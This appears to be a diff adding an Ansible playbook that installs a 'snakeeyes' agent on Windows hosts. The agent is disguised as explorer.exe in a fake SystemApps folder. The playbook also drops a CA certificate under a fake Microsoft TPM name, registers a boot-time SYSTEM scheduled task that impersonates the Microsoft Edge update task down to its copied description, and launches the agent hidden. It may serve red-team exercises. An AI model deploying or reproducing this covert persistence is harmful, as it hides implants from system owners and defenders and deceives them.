@@ -1,0 +1,39 @@
+---
+- name: Ensure agent directory exists
+  ansible.windows.win_file:
+    path: "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\"
+    state: directory
+
+- name: Copy Windows agent executable
+  ansible.windows.win_copy:
+    src: "snakeeyes-windows.exe"
+    dest: "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe"
+
+- name: Ensure cert directory exists
+  ansible.windows.win_file:
+    path: "C:\\ProgramData\\Microsoft\\Network\\TPMNetworkModuleCertificate\\"
+    state: directory
+
+- name: Copy CA cert to Windows Host
+  ansible.windows.win_copy:
+    src: "snakeeyes-ca.crt"
+    dest: "C:\\ProgramData\\Microsoft\\Network\\TPMNetworkModuleCertificate\\Microsoft_TPM_Network_DSA_Trust.crt"
+
+- name: Create scheduled task
+  community.windows.win_scheduled_task:
+    name: MicrosoftEdgeUpdateTaskMachineEN
+    description: Keeps your Microsoft software up to date. if this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.
+    actions:
+      - path: "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe"
+    triggers:
+      - type: boot
+    username: SYSTEM
+    run_level: highest
+    state: present
+    enabled: true
+
+- name: Start agent immediately
+  ansible.windows.win_shell: |
+    Start-Process -FilePath "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe" -WindowStyle Hidden
+  args:
+    executable: powershell.exe
